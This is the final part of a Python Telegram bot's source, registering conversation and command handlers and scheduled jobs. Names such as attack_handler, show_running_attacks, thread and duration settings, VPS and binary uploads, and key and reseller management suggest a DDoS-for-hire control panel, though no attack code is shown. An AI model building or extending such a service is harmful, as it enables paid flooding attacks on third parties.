    remove_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start)],
        states={
            REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    # Add bot management handlers
    add_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Bot"), add_bot_instance)],
        states={
            GET_BOT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_bot_token)],
            GET_OWNER_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_owner_username)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Bot"), remove_bot_instance)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    start_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Start Selected Bot"), start_selected_bot)],
        states={
            SELECT_BOT_TO_START: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    stop_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Stop Selected Bot"), stop_selected_bot)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, stop_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    # Add delete binary handler
    delete_binary_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Delete Binary"), delete_binary_start)],
    states={
        CONFIRM_BINARY_DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_binary_confirm)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    set_vps_handler = ConversationHandler(
        entry_points=[CommandHandler("setvps", set_vps_count)],
    states={
        GET_VPS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_vps_count_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_group_image_handler = ConversationHandler(
    entry_points=[
        CommandHandler("setgroupimage", set_group_image_start),
        MessageHandler(filters.Text("🖼️ Set Group Image"), set_group_image_start)
    ],
    states={
        GET_NEW_IMAGE_URL: [MessageHandler(filters.PHOTO, set_group_image_url)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_group_link_handler = ConversationHandler(
     entry_points=[
        CommandHandler("setgrouplink", set_group_link_start),
        MessageHandler(filters.Text("🔗 Set Group Link"), set_group_link_start)
    ],
    states={
        GET_GROUP_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND,  set_group_link_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
   
   
# Add this handler with your other handlers
    link_management_handler = ConversationHandler(
    entry_points=[MessageHandler(filters.Text("🔗 Manage Links"), manage_links)],
    states={
        GET_LINK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_number)],
        GET_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_url)],
    },
    fallbacks=[CommandHandler("cancel", cancel_conversation)],
)

    broadcast_handler = ConversationHandler(
    entry_points=[MessageHandler(filters.Text("📢 Broadcast"), broadcast_start)],
    states={
        GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)],
    },
    fallbacks=[CommandHandler("cancel", cancel_conversation)],
)

    # Add menu handler
        # Add menu handler
    menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Menu"), show_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Add Group ID"), add_group_id_start),
                MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start),
                MessageHandler(filters.Text("RE Status"), reseller_status_start),
                MessageHandler(filters.Text("VPS Status"), show_vps_status),
                MessageHandler(filters.Text("Add VPS"), add_vps_start),
                MessageHandler(filters.Text("Remove VPS"), remove_vps_start),
                MessageHandler(filters.Text("Upload Binary"), upload_binary_start),
                MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start),
                MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start),
                MessageHandler(filters.Text("Set Display Name"), set_display_name_start),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add settings menu handler
    settings_menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Settings"), settings_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Set Duration"), set_duration_start),
                MessageHandler(filters.Text("Add Reseller"), add_reseller_start),
                MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start),
                MessageHandler(filters.Text("Set Threads"), set_threads_start),
                MessageHandler(filters.Text("Add Coin"), add_coin_start),
                MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start),
                MessageHandler(filters.Text("Reset VPS"), reset_vps),
                MessageHandler(filters.Text("Co-Owner"), co_owner_management),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    

    # Add all handlers
    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(special_key_handler)
    application.add_handler(add_vps_handler)
    application.add_handler(remove_vps_handler)
    application.add_handler(link_management_handler)
    application.add_handler(upload_binary_handler)
    application.add_handler(add_co_owner_handler)
    application.add_handler(CommandHandler("users", show_users))
    application.add_handler(CommandHandler("vph", vps_health_check))
    application.add_handler(remove_co_owner_handler)
    application.add_handler(display_name_handler)
    application.add_handler(reseller_status_handler)
    application.add_handler(add_group_id_handler)
    application.add_handler(remove_group_id_handler)
    application.add_handler(menu_handler)
    application.add_handler(delete_binary_handler)
    application.add_handler(settings_menu_handler)
    application.add_handler(add_bot_handler)
    application.add_handler(remove_bot_handler)
    application.add_handler(start_bot_handler)
    application.add_handler(broadcast_handler)
    application.add_handler(stop_bot_handler)
    application.add_handler(delete_binary_handler)
    application.add_handler(set_vps_handler)
    application.add_handler(set_group_image_handler)
    application.add_handler(set_group_link_handler)
    application.add_handler(change_image_handler)
    application.add_handler(change_group_name_handler) 
    application.add_handler(CommandHandler("running", show_running_attacks))
    application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
    application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
    application.add_handler(MessageHandler(filters.ALL & (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP), track_new_chat))
    application.add_handler(MessageHandler(filters.Text("🔗 Manage Links"), manage_links))
    application.add_handler(ChatMemberHandler(track_left_chat, ChatMemberHandler.MY_CHAT_MEMBER))

    # Add job queue to check expired keys
    job_queue = application.job_queue
    job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
    # Add this to your main() function after creating the job_queue
    job_queue.run_repeating(periodic_sync, interval=300, first=60)  # Sync every 5 minutes
    application.run_polling()

if __name__ == '__main__':
    main()
    








